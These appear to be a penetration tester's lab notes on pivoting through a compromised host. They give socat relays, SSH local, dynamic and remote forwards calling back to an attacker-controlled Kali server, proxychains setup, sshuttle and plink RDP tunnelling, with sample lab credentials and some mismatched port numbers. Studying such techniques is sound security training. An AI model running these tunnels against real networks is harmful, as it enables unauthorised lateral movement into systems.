Port Forwarding = Forwarding all traffic sent to that port to another destination (i.e. another port on another machine that isn't reachable from the attacker machine).

# Using Socat
Note: Simple port forwards like these are easy to detect with network monitoring tools. 

Socat usually isn't installed on victim machines but it's possible to download and run a statically linked binary version instead.

Socat binaries: https://github.com/3ndG4me/socat/releases

Once socat is installed on the victim machine (i.e. the jumpbox between the target and attacker):
```bash
socat -ddd TCP-LISTEN:$(LPORT_OF_JUMPBOX),fork TCP:$(IP_OF_TARGET):$(RPORT_OF_TARGET)
```
## Example
There are 3 machines.
* Attacker machine can reach "jumpbox" but not "postgresql".
* Jumpbox machine that has been compromised by attacker. Can reach attacker AND postgresql. IP=192.168.50.63.
* Postgresql machine. Port 5432 is open but only accesible to Jumpbox. IP=10.4.50.215.

Attacking machine wants to access port 5432 on a postgresql server, but that server is only reachable through the jumpbox machine in between them, thus a port forward can be set up on the jumpbox for all traffic going through (for example) port 2345 to forward to port 5432 of the postgresql server:
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
Now the attacker machine can access postgresql through the jumpbox machine on port 2345:
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
```
# SSH Tunelling/Port Forwarding
Most SSH tunnelling requires a tty shell, if it's not - then do this:
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
To connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.
## Local Port Forwarding
Forwards one port to another port of another machine.
```bash
ssh -N -L 0.0.0.0:$(LPORT_OF_LISTENER):$(IP_OF_TARGET):$(RPORT_OF_TARGET) $(SSH_USER)@$(IP_OF_JUMPBOX)
```
### Example
There are 4 machines.
* Attacker machine can reach "confluence" machine.
* Confluence machine can reach "database" machine and attacker machine. IP=192.168.50.63
* Database machine can reach "SMB" machine and confluence machine. IP=10.4.50.215
* SMB machine can reach database machine. IP=172.16.50.217

Run this on the confluence machine to make smb machine port 445 reachable via 4455:
```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
Attacker machine can now access smb machine through confluence machine on port 4455:
```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```
## Dynamic Local Port Forwarding
Forwards traffic received on one port to access everything visible on another machine.

Run on the jumpbox:
```bash
ssh -N -D 0.0.0.0:9999 $(SSH_USER)@$(IP_OF_TARGET)
```
### Proxychains
To be able to use any tool through this open port forward, proxychains will need to be configured.
```bash
sudo echo "socks5 $(JUMPBOX_IP) 9999" >> /etc/proxychains4.conf
```
Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
### Example
There are 4 machines.
* Attacker machine can reach "confluence" machine.
* Confluence machine can reach "database" machine and attacker machine. IP=192.168.50.63
* Database machine can reach "SMB" machine and confluence machine. IP=10.4.50.215
* SMB machine can reach database machine. IP=172.16.50.217

Run this on the confluence machine to make all machines "database" can see reachable via 9999:
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
Edit the proxychains config on attacker machine:
```bash
sudo echo "socks5 192.168.50.63 9999" >> /etc/proxychains4.conf
```
Run commands to access different ports on the smb machine from attacker machine:
```bash
sudo proxychains4 nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```
## Remote Port Forwarding
SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server and bind the listening port there. Think of it like a reverse shell, but for port forwarding.
On attacker machine:
```bash
sudo systemctl start ssh
```
On jumpbox machine:
```bash
ssh -N -R 127.0.0.1:2345:$(TARGET_IP):$(TARGET_PORT) kali@$(ATTACKER_IP)
```
### Example
There are 4 machines.
* Attacker machine can reach "confluence" machine. IP=192.168.118.4
* Confluence machine can reach "database" machine and attacker machine. IP=192.168.50.63
* Database machine can reach "SMB" machine and confluence machine. IP=10.4.50.215
* SMB machine can reach database machine. IP=172.16.50.217

Run this on confluence to make port 5432 reachable via localhost port 2345:
```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
On the attacker machine:
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```
## Dynamic Remote Port Forwarding
Note: Only works on OpenSSH Client v7.6+. So the remote machines SSH version matters.

Remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.

Run on jumpbox:
```bash
ssh -N -R 9998 kali@$(ATTACKER_IP)
```
### Proxychains
To be able to use any tool through this open port forward, proxychains will need to be configured.
```bash
sudo echo "socks5 127.0.0.1 9999" >> /etc/proxychains4.conf
```
Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
# sshuttle
Automates Dynamic Port Forwarding. Requires:
* Root privileges on SSH Client.
* Python3 on SSH Server.

Run on jumpbox machine:
```bash
socat -ddd TCP-LISTEN:2222,fork TCP:$(IP_OF_TARGET):$(RPORT_OF_TARGET)
```
Run on attacker machine:
```bash
sshuttle -r $(SSH_USER)@$(JUMPBOX_IP):2222 $(IP_OF_TARGET_SUBNET)/24 $(IP_OF_TARGET_SUBNET)/24
```
Example:
```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```
# Windows
## ssh.exe
CMD:
```batch
where ssh
```
On the attacker machine:
```bash
sudo systemctl start ssh
```
```bash
sudo echo "socks5 127.0.0.1 9998" >> /etc/proxychains4.conf
```
On the Windows jumpbox:
```bash
ssh -N -R 9998 kali@$(IP_ADDRESS)
```
## Plink
CLI version of Putty.

Steps:
1. Transfer Plink to target. Located in /usr/share/windows-resources/binaries/plink.exe on kali.
2. (Optional) Create new user as the creds of this user will be left in logs on the target machine.
3. Start ssh server on kali:
```bash
sudo systemctl start ssh
```
4. Run plink remote port forward command on target:
```bash
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 $(ATTACKER_IP)
```
We can now do RDP to the target through port 80 on the target machine (bound to port 9833 on kali):
```
xfreerdp /u:$(USERNAME) /p:$(PASSWORD) /v:127.0.0.1:9833
```
